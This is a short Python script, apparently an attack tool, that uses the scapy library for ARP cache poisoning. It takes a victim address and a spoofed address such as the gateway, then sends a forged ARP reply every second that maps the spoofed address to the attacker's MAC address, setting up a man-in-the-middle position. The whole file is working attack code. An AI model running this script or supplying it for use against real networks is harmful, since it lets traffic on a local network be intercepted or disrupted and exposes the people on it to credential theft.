#!/usr/bin/env python3
from scapy.all import *
import sys, time

if len(sys.argv) != 3:
    print("Usage: python3 arp_poisoning.py <VICTIM_IP> <FAKE_IP>")
    sys.exit(1)

victim_ip = sys.argv[1]
fake_ip   = sys.argv[2]
iface = "eth0"   # change si besoin

victim_mac = getmacbyip(victim_ip)
if victim_mac is None:
    print("[!] Victim MAC not found (victim unreachable?)")
    sys.exit(1)

attacker_mac = get_if_hwaddr(iface)

print(f"[+] Victim: {victim_ip} -> {victim_mac}")
print(f"[+] Poisoning: telling {victim_ip} that {fake_ip} is-at {attacker_mac}")

pkt = Ether(dst=victim_mac, src=attacker_mac) / ARP(
    op=2,              # is-at (ARP reply)
    psrc=fake_ip,      # IP qu'on usurpe (ex: gateway)
    hwsrc=attacker_mac,# MAC attaquant
    pdst=victim_ip,    # victime
    hwdst=victim_mac   # MAC victime
)

try:
    while True:
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Stopped.")
                                           